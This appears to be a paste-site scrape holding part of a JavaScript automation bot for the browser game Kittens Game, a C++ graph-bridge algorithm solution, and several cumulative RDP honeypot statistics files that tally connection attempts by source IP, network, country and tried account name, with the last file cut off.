myConfig.steelSec			= g('autosteelSec').value;
myConfig.steelSpend			= g('autosteelSpend').value;
myConfig.manuscript			= g('automanuscript').checked;
myConfig.manuscriptSec		= g('automanuscriptSec').value;
myConfig.manuscriptSpend	= g('automanuscriptSpend').value;
myConfig.kerosene			= g('autokerosene').checked;
myConfig.keroseneSec		= g('autokeroseneSec').value;
myConfig.keroseneSpend		= g('autokeroseneSpend').value;
myConfig.thorium			= g('autothorium').checked;
myConfig.thoriumSec			= g('autothoriumSec').value;
myConfig.thoriumSpend		= g('autothoriumSpend').value;
myConfig.alloy				= g('autoalloy').checked;
myConfig.alloySec			= g('autoalloySec').value;
myConfig.alloySpend			= g('autoalloySpend').value;
myConfig.eludium			= g('autoeludium').checked;
myConfig.eludiumSec			= g('autoeludiumSec').value;
myConfig.eludiumSpend		= g('autoeludiumSpend').value;

localStorage.setItem(""nipBotConfig"", JSON.stringify(myConfig));
	
}

/*
  ______                 ____        _   
 |  ____|               |  _ \      | |  
 | |__ _   _ _ __  ___  | |_) | ___ | |_ 
 |  __| | | | '_ \/ __| |  _ < / _ \| __|
 | |  | |_| | | | \__ \ | |_) | (_) | |_ 
 |_|   \__,_|_| |_|___/ |____/ \___/ \__|
                                         
*/


function nipBot()
{
	if(gamePage.ticks >= lastTick + evryTicks)
	{
		//console.log(gamePage.ticks);
		
		
		mySpinner();
		myJobs();
		setTimeout(myJobsTrade1, 450);
		setTimeout(myJobsTrade2, 850);

		lastTick = gamePage.ticks;
	}
}

function myJobsTrade1()
{
	if(myConfig.autoTradeZebras)
	{
		//console.log(""BRUH_autoTradeZebras"");
		if(myConfig.autoTradeZebrasTitaniumPerCent == 100)
		{
			gamePage.diplomacy.tradeMultiple(getRace(""zebras""), myConfig.autoTradeZebrasSpend);
			//console.log(""autoTradeZebrasTitaniumPerCent==100"");
		}
		else if (gr(""titanium"").value < ((gr(""titanium"").maxValue / 100) * myConfig.autoTradeZebrasTitaniumPerCent) )
		{
			gamePage.diplomacy.tradeMultiple(getRace(""zebras""), myConfig.autoTradeZebrasSpend);
			//console.log(""autoTradeZebrasTitaniumPerCent!=100"");
		}
	}
}
function myJobsTrade2()
{	
	if(myConfig.autoTradeLeviathans)
	{
		//console.log(""BRUH_autoTradeLeviathans"");
		//gamePage.diplomacy.tradeMultiple(getRace(""leviathans""), 99)
		if(getRace(""leviathans"").duration > 10)
		{
			if ((gr(""unobtainium"").value + (gr(""unobtainium"").perTickCached * 5 * myConfig.autoTradeLeviathansSec)) > gr(""unobtainium"").maxValue)
			{
				nbToCraft = Math.floor( (gr(""unobtainium"").value * (myConfig.autoTradeLeviathansSpend / 100)) / 5000 );
				if(nbToCraft < 1){nbToCraft = 1;}
				gamePage.diplomacy.tradeMultiple(getRace(""leviathans""), nbToCraft)
				
				//console.log(""autoTradeLeviathans_nbToCraft=""+nbToCraft);
			}
		
		}
	}	
}

function myJobs()
{
	var nbToCraft = 0;
	var objTemp;
	var objTempSec;
	var priceTmp;
	
	myConfig.speedTmp = myConfig.speed;
	myConfig.speed = 1;
	if(myConfig.autoObserveBtn)
	{
		if (g('observeBtn') != null)
		{
			g('observeBtn').click();
		}
	}
	if(myConfig.autoHunt)
	{
		if ((gr(""manpower"").value + (gr(""manpower"").perTickCached * 5 * myConfig.autoHuntSec)) > gr(""manpower"").maxValue)
		{
			gamePage.village.huntAll();
		}
	}	

	

	
	if(myConfig.autoTradeBcoin)
	{
		if(getRace(""leviathans"").duration > 1)
		{
			if(gamePage.calendar.cryptoPrice < myConfig.autoTradeBcoinBuyMax)
			{
				if( (gamePage.resPool.resourceMap.relic.value / gamePage.calendar.cryptoPrice) >= (gamePage.resPool.resourceMap.blackcoin.value / 1000) )
				//if(gamePage.resPool.resourceMap.relic.value >= (gamePage.calendar.cryptoPrice * 100) )
				{
					game.diplomacy.buyBcoin();
				}
			}
			if(gamePage.calendar.cryptoPrice > myConfig.autoTradeBcoinSellMin)
			{
				if(gamePage.resPool.resourceMap.blackcoin.value > 0)
				{
					game.diplomacy.sellBcoin();
				}				
			}
		}
	}
	if(myConfig.autoCombustTC)
	{
		if(gamePage.time.heat < myConfig.autoCombustTCHeat)
		{
			if(myConfig.autoCombustTCNb == 1)
			{
				gamePage.timeTab.cfPanel.children[0].children[0].onClick();
			}
			else if(myConfig.autoCombustTCNb == 5)
			{
				gamePage.timeTab.cfPanel.children[0].children[0].model.nextCycleLink.handler();
			}
			else if(myConfig.autoCombustTCNb == 45)
			{
				gamePage.timeTab.cfPanel.children[0].children[0].model.previousCycleLink.handler();
			}
			else if(myConfig.autoCombustTCNb == 500)
			{
				gamePage.timeTab.cfPanel.children[0].children[0].model.tenErasLink.handler();
			}
			
			//gamePage.timeTab.cfPanel.children[0].children[0].onClick();
			//gamePage.timeTab.cfPanel.children[0].children[0].model.nextCycleLink.handler(); //x5
			//gamePage.timeTab.cfPanel.children[0].children[0].model.previousCycleLink.handler(); //x45
			//gamePage.timeTab.cfPanel.children[0].children[0].model.tenErasLink.handler(); //x500
		}
	}
	if(myConfig.autoResetPraise)
	{
		if(gamePage.religion.faith > myConfig.autoResetPraiseUnit)
		{
			//gamePage.tabs[5].resetFaithInternal(1.01);
			//gamePage.religionTab.resetFaithInternal(1.01);
			game.religion.resetFaith(1.01, false);
			
		}
	}

	if(myConfig.autoPraise)
	{
		if ((gr(""faith"").value + (gr(""faith"").perTickCached * 5 * myConfig.autoPraiseSec)) > gr(""faith"").maxValue)
		{
			gamePage.religion.praise();
		}
	}
	
	if(myConfig.autoFurs)
	{
		if (gr(""furs"").value > myConfig.autoFursSec)
		{
			gamePage.craft(""parchment"", Math.floor(gr(""furs"").value / 1000) );
		}
	}	
	if(myConfig.autoCompedium)
	{
		if ((gr(""science"").value + (gr(""science"").perTickCached * 5 * myConfig.autoCompediumSec)) > gr(""science"").maxValue)
		{
			//nbToCraft = Math.floor( (gr(""science"").perTickCached * 5 * myConfig.autoCompediumSec) / 10000);
			nbToCraft = Math.floor( (gr(""science"").value * (myConfig.autoCompediumSpend / 100)) / 10000 );
			if(nbToCraft < 1){nbToCraft = 1;}
			gamePage.craft(""compedium"", nbToCraft);
		}
	}	
	if(myConfig.autoBlueprint)
	{
		if ((gr(""science"").value + (gr(""science"").perTickCached * 5 * myConfig.autoBlueprintSec)) > gr(""science"").maxValue)
		{
			//nbToCraft = Math.floor( (gr(""science"").perTickCached * 5 * myConfig.autoBlueprintSec) / 25000);
			nbToCraft = Math.floor( (gr(""science"").value * (myConfig.autoBlueprintSpend / 100)) / 25000 );
			if(nbToCraft < 1){nbToCraft = 1;}
			gamePage.craft(""blueprint"", nbToCraft);
		}
	}
	
	craftList.forEach(function(truck){	
	objTemp = eval(""myConfig.""+truck[0]);
	objTempSec = eval(""myConfig.""+truck[0]+""Sec"");
	priceTmp = myLast(gamePage.workshop.getCraft(truck[0]).prices).val;
	
	if(objTemp)
	{
		if ((gr(truck[1]).value + (gr(truck[1]).perTickCached * 5 * objTempSec)) > gr(truck[1]).maxValue)
		{
			//nbToCraft = Math.floor( (gr(truck[1]).perTickCached * 5 * objTempSec) / priceTmp);
			nbToCraft = Math.floor( (gr(truck[1]).value * ( eval(""myConfig.""+truck[0]+""Spend"") / 100)) / priceTmp );
			if(nbToCraft < 1){nbToCraft = 1;}
			gamePage.craft(truck[0], nbToCraft);
		}
	}
		
	})
	myConfig.speed = myConfig.speedTmp;
	
}


//
// Lag test
//

var checkLagOld = 0;
var checkLagNow = 0;
var checkLagSpeed = 0;
var checkLagIsLaggin = false;
var checkLagNbSecToCheck = 300;
checkLag();

function checkLag()
{
	//console.log(""checkLag Start"");
	
	checkLagOld = Math.round(game.calendar.trueYear() * game.calendar.seasonsPerYear * game.calendar.daysPerSeason * game.calendar.ticksPerDay / game.ticksPerSecond);
	
	setTimeout(checkLagNext, 1000);
}

function checkLagNext()
{
	//console.log(""checkLagNow Start"");
	checkLagNow = Math.round(game.calendar.trueYear() * game.calendar.seasonsPerYear * game.calendar.daysPerSeason * game.calendar.ticksPerDay / game.ticksPerSecond);
	
	calculatedSpeed = Math.round(checkLagNow - checkLagOld);
	
	console.log(""Speed\t""+calculatedSpeed+""/""+myConfig.speed);
	
	if(checkLagIsLaggin)
	{
		if(calculatedSpeed > myConfig.speed + 2)
		{
			console.log(""DejaVu!"");
			setTimeout(checkLag, 1000*2);
		}
		else
		{
			console.log(""DejaVu stoped ^^' ""+game.calendar.year);
			checkLagIsLaggin = false;
			myConfig.speed = checkLagSpeed;
			setTimeout(checkLag, 1000*checkLagNbSecToCheck);
		}
	}
	else
	{
		//if(calculatedSpeed < myConfig.speed)
		//{
			checkLagIsLaggin = true;
			checkLagSpeed = myConfig.speed;
			myConfig.speed = 1;
			setTimeout(checkLag, 1000*5);
		//}
		//else
		//{
		//	setTimeout(checkLag, 1000*checkLagNbSecToCheck);			
		//}
	}

}"
7auSjEMd,Bridge Compression,hv22,C++,Sunday 9th of July 2023 07:38:51 PM CDT,"#include<bits/stdc++.h>
using namespace std;

typedef long long ll;
typedef pair<int, int> pii;

const int MAX = 2e6 + 15;
const int INF = 0x3f3f3f3f;
const int MOD = 1e9 + 7;

#define pb push_back
#define sz(x) (int) x.size()
#define fr first
#define sc second
#define mp make_pair
#define all(x) x.begin(), x.end()
#define dbg(x) cerr << #x << "": "" << ""[ "" << x << "" ]\n""

int n, m, t, ans, numBridge, bridge[MAX], low[MAX], pre[MAX], seen[MAX], tseen[MAX], used[MAX], cmp[MAX];
vector<pii> adj[MAX], edges;
vector<int> tree[MAX];
int mx, id;

void reset(){
    for(int i = 0; i <= n + 10; i++){
        low[i] = 0;
        pre[i] = 0;
        seen[i] = 0;
        tseen[i] = 0;
        used[i] = 0;
        cmp[i] = 0;

        adj[i].clear();
        tree[i].clear();
    }

    for(int i = 0; i <= m + 10; i++)
        bridge[i] = 0;

    t = 0, ans = 0, numBridge = 0;
    edges.clear();
}

void ldfs(int u, int p){ //low link to find bridges
    pre[u] = low[u] = t++;
    seen[u] = true;

    for(auto e : adj[u]){
        int v = e.fr, id = e.sc;
        if(v == p) continue;

        if(seen[v]){
            low[u] = min(low[u], pre[v]);

        }else{
            ldfs(v, u);
            low[u] = min(low[u], low[v]);

            if(low[v] > pre[u]){
                numBridge++;
                bridge[id] = true;
            }
        }
    }
}

void dfs1(int u, int p, int c){ //build components
    used[u] = true;
    cmp[u] = c;

    for(auto e : adj[u]){
        int v = e.fr, id = e.sc;
        
        if(bridge[id] || used[v]) continue;
        dfs1(v, u, c);
    }
}


int main(){
    ios_base::sync_with_stdio(false);
    cin.tie(NULL); 

    int tc; cin >> tc;

    while(tc--){
        cin >> n >> m;

        for(int i = 0; i < m; i++){
            int u, v; cin >> u >> v;
            adj[u].pb({v, i});
            adj[v].pb({u, i});

            edges.pb({u, v});
        }

        ldfs(1, -1);

        int comp = 1;

        for(int i = 1; i <= n; i++)
            if(!used[i]) dfs1(i, -1, comp++);

        for(int i = 0; i < m; i++){
            if(bridge[i]){
                int u = edges[i].fr, v = edges[i].sc;
                tree[cmp[u]].pb(cmp[v]);
                tree[cmp[v]].pb(cmp[u]);
            }
        }

        reset();
    }

    return 0;
}
"
8ADkpGz5,2023-07-09_stats.json,rdp_snitch,JSON,Sunday 9th of July 2023 07:18:13 PM CDT,"{
  ""ip"": {
    ""43.156.9.187"": 90,
    ""92.204.139.79"": 123,
    ""120.71.0.5"": 111,
    ""125.74.93.228"": 138,
    ""20.42.101.211"": 171,
    ""69.58.124.234"": 135,
    ""192.99.110.133"": 9,
    ""46.10.214.186"": 99,
    ""58.218.204.183"": 9,
    ""114.217.18.245"": 108,
    ""185.66.228.185"": 36,
    ""143.198.68.135"": 3,
    ""120.132.17.153"": 39,
    ""168.138.149.190"": 39,
    ""43.153.216.55"": 6,
    ""167.94.138.127"": 3,
    ""201.93.165.53"": 21,
    ""112.5.87.34"": 3,
    ""180.102.17.129"": 30,
    ""36.138.171.93"": 60,
    ""36.108.169.132"": 93,
    ""150.230.79.119"": 39,
    ""172.104.48.172"": 147,
    ""101.132.121.192"": 6,
    ""172.104.61.185"": 60,
    ""193.169.255.78"": 6,
    ""178.21.163.70"": 15,
    ""141.98.82.22"": 3,
    ""194.26.29.78"": 3,
    ""31.43.185.32"": 30,
    ""60.250.29.35"": 45,
    ""139.59.167.98"": 6,
    ""87.251.75.120"": 3,
    ""143.42.114.65"": 60,
    ""185.81.68.134"": 6,
    ""36.137.91.143"": 30,
    ""45.119.81.119"": 3,
    ""185.142.236.35"": 9,
    ""192.99.110.148"": 9,
    ""60.205.170.161"": 3,
    ""152.67.11.225"": 6,
    ""103.167.91.245"": 1086,
    ""167.172.76.60"": 12,
    ""146.190.88.216"": 3,
    ""45.140.17.16"": 9,
    ""143.198.217.206"": 33,
    ""143.198.99.179"": 42,
    ""104.152.52.133"": 3,
    ""205.210.31.244"": 9,
    ""45.79.65.243"": 6,
    ""164.92.158.134"": 3,
    ""103.197.25.122"": 18,
    ""103.195.236.213"": 6,
    ""5.189.128.128"": 6,
    ""205.210.31.57"": 9
  },
  ""asn"": {
    ""AS132203"": 96,
    ""AS398108"": 123,
    ""AS137695"": 204,
    ""AS141998"": 138,
    ""AS8075"": 171,
    ""AS32899"": 135,
    ""AS16276"": 18,
    ""AS8866"": 99,
    ""AS4134"": 117,
    ""AS201689"": 36,
    ""AS14061"": 102,
    ""AS140292"": 39,
    ""AS31898"": 84,
    ""AS398324"": 3,
    ""AS27699"": 21,
    ""AS9808"": 93,
    ""AS134756"": 30,
    ""AS63949"": 273,
    ""AS37963"": 9,
    ""AS198810"": 6,
    ""AS21419"": 15,
    ""AS209588"": 3,
    ""AS206728"": 3,
    ""AS211736"": 30,
    ""AS3462"": 45,
    ""AS208091"": 3,
    ""AS57523"": 6,
    ""AS131386"": 3,
    ""AS174"": 9,
    ""AS63737"": 1086,
    ""AS198953"": 9,
    ""AS14987"": 3,
    ""AS396982"": 18,
    ""AS55933"": 18,
    ""AS140827"": 6,
    ""AS51167"": 6
  },
  ""isp"": {
    ""Shenzhen Tencent Computer Systems Company Limited"": 90,
    ""GoDaddy.com, LLC"": 123,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 204,
    ""China Telecom"": 168,
    ""Microsoft Corporation"": 171,
    ""Bresco Broadband"": 135,
    ""OVH SAS"": 18,
    ""Vivacom Bulgaria EAD"": 99,
    ""Chinanet"": 117,
    ""Lamerd Information & Communication Technology Co., ltd"": 36,
    ""DigitalOcean, LLC"": 96,
    ""Addresses CNNIC"": 39,
    ""Oracle Corporation"": 84,
    ""Aceville Pte.ltd"": 6,
    ""Censys, Inc."": 3,
    ""Vivo"": 21,
    ""China Mobile"": 93,
    ""Akamai Technologies"": 207,
    ""Hangzhou Alibaba Advertising Co"": 9,
    ""Agata Grabowska trading as FUFO Studio"": 6,
    ""Pishtaze E Jadid Infomration Company"": 15,
    ""Flyservers S.A."": 3,
    ""Media Land LLC"": 3,
    ""FOP Dmytro Nedilskyi"": 30,
    ""Chunghwa Telecom Co., Ltd."": 45,
    ""DIGITALOCEAN"": 6,
    ""XHOST-INTERNET-SOLUTIONS"": 3,
    ""Akamai Technologies, Inc."": 66,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Long Van System Solution"": 3,
    ""Cogent Communications"": 9,
    ""Vietserver Services Technology Company Limited"": 1086,
    ""Proton66 OOO"": 9,
    ""Rethem Hosting LLC"": 3,
    ""Google LLC"": 18,
    ""Cloudie Limited"": 18,
    ""AZ Viet NAM Communications Technology Company Limited"": 6,
    ""Contabo GmbH"": 6
  },
  ""org"": {
    ""Tencent Cloud Computing"": 90,
    ""Unknown"": 222,
    ""Chinanet XJ"": 111,
    ""Chinanet GS"": 138,
    ""Microsoft Azure Cloud (eastus)"": 171,
    ""Bresco Broadband"": 135,
    ""AVAST Software"": 18,
    ""Bulgarian Telecommunications Company Plc"": 99,
    ""Chinanet JS"": 147,
    ""DigitalOcean, LLC"": 102,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 78,
    ""Censys, Inc"": 3,
    ""TELEF\ufffdNICA BRASIL S.A"": 21,
    ""China Mobile Communications Corporation"": 93,
    ""Chinanet ZJ"": 93,
    ""Linode"": 273,
    ""Aliyun Computing Co., LTD"": 9,
    ""FUFO Studio"": 6,
    ""Vdsline"": 3,
    ""Media Land LLC"": 3,
    ""FOP Dmytro Nedilskyi"": 30,
    ""Chunghwa Telecom Co. Ltd."": 45,
    ""Xhost Internet Solutions"": 3,
    ""Starcrecium Limited"": 6,
    ""BlackHOST Ltd."": 9,
    ""Oracle Cloud Infrastructure (ap-mumbai-1)"": 6,
    ""Vietserver Viet NAM Service Technology Company Limited"": 1086,
    ""Proton66 LLC"": 9,
    ""Rethem Hosting LLC"": 3,
    ""Palo Alto Networks, Inc"": 18,
    ""HK Mainstream Cloud Network Technology Limited"": 18,
    ""DULIEUAZ"": 6,
    ""Contabo GmbH"": 6
  },
  ""regionName"": {
    ""North West"": 303,
    ""Virginia"": 294,
    ""Xinjiang Uyghur Autonomous Region"": 111,
    ""Gansu"": 138,
    ""Ohio"": 135,
    ""Quebec"": 18,
    ""Sofia-Capital"": 99,
    ""Jiangsu"": 147,
    ""Tehran"": 51,
    ""California"": 69,
    ""Beijing"": 42,
    ""Sao Paulo"": 99,
    ""Michigan"": 3,
    ""Guangdong"": 93,
    ""Zhejiang"": 93,
    ""Shanghai"": 6,
    ""Mazovia"": 6,
    ""Provincia de Panama"": 3,
    ""St.-Petersburg"": 3,
    ""Kyiv City"": 30,
    ""Taipei City"": 45,
    ""England"": 6,
    ""North Holland"": 15,
    ""New Jersey"": 60,
    ""Moscow"": 15,
    ""Ho Chi Minh"": 9,
    ""Maharashtra"": 6,
    ""Tinh Hung Yen"": 1086,
    ""South West"": 48,
    ""Illinois"": 3,
    ""Wan Chai"": 18,
    ""Bavaria"": 6
  },
  ""country"": {
    ""Singapore"": 351,
    ""United States"": 564,
    ""China"": 630,
    ""Canada"": 18,
    ""Bulgaria"": 99,
    ""Iran"": 51,
    ""Brazil"": 99,
    ""Poland"": 6,
    ""Panama"": 3,
    ""Russia"": 18,
    ""Ukraine"": 30,
    ""Taiwan"": 45,
    ""United Kingdom"": 6,
    ""Netherlands"": 15,
    ""Vietnam"": 1095,
    ""India"": 6,
    ""Hong Kong"": 18,
    ""Germany"": 6
  },
  ""account"": {
    ""hello"": 1797,
    ""142.93.8.59"": 1167,
    ""(empty)"": 6,
    ""Domain"": 27,
    ""Administr"": 33,
    ""root"": 9,
    ""nmap"": 3,
    ""jhwCgUuMa"": 3,
    ""KGWiHV"": 3,
    ""XOLKFO"": 3,
    ""MJDmixugL"": 3,
    ""mmJhFN"": 3,
    ""lTnvHb"": 3
  },
  ""keyboard"": {
    ""Unknown"": 3060
  },
  ""client_build"": {
    ""Unknown"": 3060
  },
  ""client_name"": {
    ""Unknown"": 3060
  },
  ""ip_type"": {
    ""hosting"": 696,
    ""Unknown"": 2004,
    ""hosting & proxy"": 105,
    ""proxy"": 15,
    ""mobile"": 240
  }
}"
zr8seb58,2023-07-09_stats.json,rdp_snitch,JSON,Sunday 9th of July 2023 07:16:12 PM CDT,"{
  ""ip"": {
    ""43.156.9.187"": 60,
    ""92.204.139.79"": 82,
    ""120.71.0.5"": 74,
    ""125.74.93.228"": 92,
    ""20.42.101.211"": 114,
    ""69.58.124.234"": 90,
    ""192.99.110.133"": 6,
    ""46.10.214.186"": 66,
    ""58.218.204.183"": 6,
    ""114.217.18.245"": 72,
    ""185.66.228.185"": 24,
    ""143.198.68.135"": 2,
    ""120.132.17.153"": 26,
    ""168.138.149.190"": 26,
    ""43.153.216.55"": 4,
    ""167.94.138.127"": 2,
    ""201.93.165.53"": 14,
    ""112.5.87.34"": 2,
    ""180.102.17.129"": 20,
    ""36.138.171.93"": 40,
    ""36.108.169.132"": 62,
    ""150.230.79.119"": 26,
    ""172.104.48.172"": 98,
    ""101.132.121.192"": 4,
    ""172.104.61.185"": 40,
    ""193.169.255.78"": 4,
    ""178.21.163.70"": 10,
    ""141.98.82.22"": 2,
    ""194.26.29.78"": 2,
    ""31.43.185.32"": 20,
    ""60.250.29.35"": 30,
    ""139.59.167.98"": 4,
    ""87.251.75.120"": 2,
    ""143.42.114.65"": 40,
    ""185.81.68.134"": 4,
    ""36.137.91.143"": 20,
    ""45.119.81.119"": 2,
    ""185.142.236.35"": 6,
    ""192.99.110.148"": 6,
    ""60.205.170.161"": 2,
    ""152.67.11.225"": 4,
    ""103.167.91.245"": 724,
    ""167.172.76.60"": 8,
    ""146.190.88.216"": 2,
    ""45.140.17.16"": 6,
    ""143.198.217.206"": 22,
    ""143.198.99.179"": 28,
    ""104.152.52.133"": 2,
    ""205.210.31.244"": 6,
    ""45.79.65.243"": 4,
    ""164.92.158.134"": 2,
    ""103.197.25.122"": 12,
    ""103.195.236.213"": 4,
    ""5.189.128.128"": 4,
    ""205.210.31.57"": 6
  },
  ""asn"": {
    ""AS132203"": 64,
    ""AS398108"": 82,
    ""AS137695"": 136,
    ""AS141998"": 92,
    ""AS8075"": 114,
    ""AS32899"": 90,
    ""AS16276"": 12,
    ""AS8866"": 66,
    ""AS4134"": 78,
    ""AS201689"": 24,
    ""AS14061"": 68,
    ""AS140292"": 26,
    ""AS31898"": 56,
    ""AS398324"": 2,
    ""AS27699"": 14,
    ""AS9808"": 62,
    ""AS134756"": 20,
    ""AS63949"": 182,
    ""AS37963"": 6,
    ""AS198810"": 4,
    ""AS21419"": 10,
    ""AS209588"": 2,
    ""AS206728"": 2,
    ""AS211736"": 20,
    ""AS3462"": 30,
    ""AS208091"": 2,
    ""AS57523"": 4,
    ""AS131386"": 2,
    ""AS174"": 6,
    ""AS63737"": 724,
    ""AS198953"": 6,
    ""AS14987"": 2,
    ""AS396982"": 12,
    ""AS55933"": 12,
    ""AS140827"": 4,
    ""AS51167"": 4
  },
  ""isp"": {
    ""Shenzhen Tencent Computer Systems Company Limited"": 60,
    ""GoDaddy.com, LLC"": 82,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 136,
    ""China Telecom"": 112,
    ""Microsoft Corporation"": 114,
    ""Bresco Broadband"": 90,
    ""OVH SAS"": 12,
    ""Vivacom Bulgaria EAD"": 66,
    ""Chinanet"": 78,
    ""Lamerd Information & Communication Technology Co., ltd"": 24,
    ""DigitalOcean, LLC"": 64,
    ""Addresses CNNIC"": 26,
    ""Oracle Corporation"": 56,
    ""Aceville Pte.ltd"": 4,
    ""Censys, Inc."": 2,
    ""Vivo"": 14,
    ""China Mobile"": 62,
    ""Akamai Technologies"": 138,
    ""Hangzhou Alibaba Advertising Co"": 6,
    ""Agata Grabowska trading as FUFO Studio"": 4,
    ""Pishtaze E Jadid Infomration Company"": 10,
    ""Flyservers S.A."": 2,
    ""Media Land LLC"": 2,
    ""FOP Dmytro Nedilskyi"": 20,
    ""Chunghwa Telecom Co., Ltd."": 30,
    ""DIGITALOCEAN"": 4,
    ""XHOST-INTERNET-SOLUTIONS"": 2,
    ""Akamai Technologies, Inc."": 44,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Long Van System Solution"": 2,
    ""Cogent Communications"": 6,
    ""Vietserver Services Technology Company Limited"": 724,
    ""Proton66 OOO"": 6,
    ""Rethem Hosting LLC"": 2,
    ""Google LLC"": 12,
    ""Cloudie Limited"": 12,
    ""AZ Viet NAM Communications Technology Company Limited"": 4,
    ""Contabo GmbH"": 4
  },
  ""org"": {
    ""Tencent Cloud Computing"": 60,
    ""Unknown"": 148,
    ""Chinanet XJ"": 74,
    ""Chinanet GS"": 92,
    ""Microsoft Azure Cloud (eastus)"": 114,
    ""Bresco Broadband"": 90,
    ""AVAST Software"": 12,
    ""Bulgarian Telecommunications Company Plc"": 66,
    ""Chinanet JS"": 98,
    ""DigitalOcean, LLC"": 68,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 52,
    ""Censys, Inc"": 2,
    ""TELEF\ufffdNICA BRASIL S.A"": 14,
    ""China Mobile Communications Corporation"": 62,
    ""Chinanet ZJ"": 62,
    ""Linode"": 182,
    ""Aliyun Computing Co., LTD"": 6,
    ""FUFO Studio"": 4,
    ""Vdsline"": 2,
    ""Media Land LLC"": 2,
    ""FOP Dmytro Nedilskyi"": 20,
    ""Chunghwa Telecom Co. Ltd."": 30,
    ""Xhost Internet Solutions"": 2,
    ""Starcrecium Limited"": 4,
    ""BlackHOST Ltd."": 6,
    ""Oracle Cloud Infrastructure (ap-mumbai-1)"": 4,
    ""Vietserver Viet NAM Service Technology Company Limited"": 724,
    ""Proton66 LLC"": 6,
    ""Rethem Hosting LLC"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""HK Mainstream Cloud Network Technology Limited"": 12,
    ""DULIEUAZ"": 4,
    ""Contabo GmbH"": 4
  },
  ""regionName"": {
    ""North West"": 202,
    ""Virginia"": 196,
    ""Xinjiang Uyghur Autonomous Region"": 74,
    ""Gansu"": 92,
    ""Ohio"": 90,
    ""Quebec"": 12,
    ""Sofia-Capital"": 66,
    ""Jiangsu"": 98,
    ""Tehran"": 34,
    ""California"": 46,
    ""Beijing"": 28,
    ""Sao Paulo"": 66,
    ""Michigan"": 2,
    ""Guangdong"": 62,
    ""Zhejiang"": 62,
    ""Shanghai"": 4,
    ""Mazovia"": 4,
    ""Provincia de Panama"": 2,
    ""St.-Petersburg"": 2,
    ""Kyiv City"": 20,
    ""Taipei City"": 30,
    ""England"": 4,
    ""North Holland"": 10,
    ""New Jersey"": 40,
    ""Moscow"": 10,
    ""Ho Chi Minh"": 6,
    ""Maharashtra"": 4,
    ""Tinh Hung Yen"": 724,
    ""South West"": 32,
    ""Illinois"": 2,
    ""Wan Chai"": 12,
    ""Bavaria"": 4
  },
  ""country"": {
    ""Singapore"": 234,
    ""United States"": 376,
    ""China"": 420,
    ""Canada"": 12,
    ""Bulgaria"": 66,
    ""Iran"": 34,
    ""Brazil"": 66,
    ""Poland"": 4,
    ""Panama"": 2,
    ""Russia"": 12,
    ""Ukraine"": 20,
    ""Taiwan"": 30,
    ""United Kingdom"": 4,
    ""Netherlands"": 10,
    ""Vietnam"": 730,
    ""India"": 4,
    ""Hong Kong"": 12,
    ""Germany"": 4
  },
  ""account"": {
    ""hello"": 1198,
    ""142.93.8.59"": 778,
    ""(empty)"": 4,
    ""Domain"": 18,
    ""Administr"": 22,
    ""root"": 6,
    ""nmap"": 2,
    ""jhwCgUuMa"": 2,
    ""KGWiHV"": 2,
    ""XOLKFO"": 2,
    ""MJDmixugL"": 2,
    ""mmJhFN"": 2,
    ""lTnvHb"": 2
  },
  ""keyboard"": {
    ""Unknown"": 2040
  },
  ""client_build"": {
    ""Unknown"": 2040
  },
  ""client_name"": {
    ""Unknown"": 2040
  },
  ""ip_type"": {
    ""hosting"": 464,
    ""Unknown"": 1336,
    ""hosting & proxy"": 70,
    ""proxy"": 10,
    ""mobile"": 160
  }
}"
mW7WeBuz,2023-07-09_stats.json,rdp_snitch,JSON,Sunday 9th of July 2023 07:15:08 PM CDT,"{
  ""ip"": {
    ""43.156.9.187"": 30,
    ""92.204.139.79"": 41,
    ""120.71.0.5"": 37,
    ""125.74.93.228"": 46,
    ""20.42.101.211"": 57,
    ""69.58.124.234"": 45,
    ""192.99.110.133"": 3,
    ""46.10.214.186"": 33,
    ""58.218.204.183"": 3,
    ""114.217.18.245"": 36,
    ""185.66.228.185"": 12,
    ""143.198.68.135"": 1,
    ""120.132.17.153"": 13,
    ""168.138.149.190"": 13,
    ""43.153.216.55"": 2,
    ""167.94.138.127"": 1,
    ""201.93.165.53"": 7,
    ""112.5.87.34"": 1,
    ""180.102.17.129"": 10,
    ""36.138.171.93"": 20,
    ""36.108.169.132"": 31,
    ""150.230.79.119"": 13,
    ""172.104.48.172"": 49,
    ""101.132.121.192"": 2,
    ""172.104.61.185"": 20,
    ""193.169.255.78"": 2,
    ""178.21.163.70"": 5,
    ""141.98.82.22"": 1,
    ""194.26.29.78"": 1,
    ""31.43.185.32"": 10,
    ""60.250.29.35"": 15,
    ""139.59.167.98"": 2,
    ""87.251.75.120"": 1,
    ""143.42.114.65"": 20,
    ""185.81.68.134"": 2,
    ""36.137.91.143"": 10,
    ""45.119.81.119"": 1,
    ""185.142.236.35"": 3,
    ""192.99.110.148"": 3,
    ""60.205.170.161"": 1,
    ""152.67.11.225"": 2,
    ""103.167.91.245"": 362,
    ""167.172.76.60"": 4,
    ""146.190.88.216"": 1,
    ""45.140.17.16"": 3,
    ""143.198.217.206"": 11,
    ""143.198.99.179"": 14,
    ""104.152.52.133"": 1,
    ""205.210.31.244"": 3,
    ""45.79.65.243"": 2,
    ""164.92.158.134"": 1,
    ""103.197.25.122"": 6,
    ""103.195.236.213"": 2,
    ""5.189.128.128"": 2,
    ""205.210.31.57"": 3
  },
  ""asn"": {
    ""AS132203"": 32,
    ""AS398108"": 41,
    ""AS137695"": 68,
    ""AS141998"": 46,
    ""AS8075"": 57,
    ""AS32899"": 45,
    ""AS16276"": 6,
    ""AS8866"": 33,
    ""AS4134"": 39,
    ""AS201689"": 12,
    ""AS14061"": 34,
    ""AS140292"": 13,
    ""AS31898"": 28,
    ""AS398324"": 1,
    ""AS27699"": 7,
    ""AS9808"": 31,
    ""AS134756"": 10,
    ""AS63949"": 91,
    ""AS37963"": 3,
    ""AS198810"": 2,
    ""AS21419"": 5,
    ""AS209588"": 1,
    ""AS206728"": 1,
    ""AS211736"": 10,
    ""AS3462"": 15,
    ""AS208091"": 1,
    ""AS57523"": 2,
    ""AS131386"": 1,
    ""AS174"": 3,
    ""AS63737"": 362,
    ""AS198953"": 3,
    ""AS14987"": 1,
    ""AS396982"": 6,
    ""AS55933"": 6,
    ""AS140827"": 2,
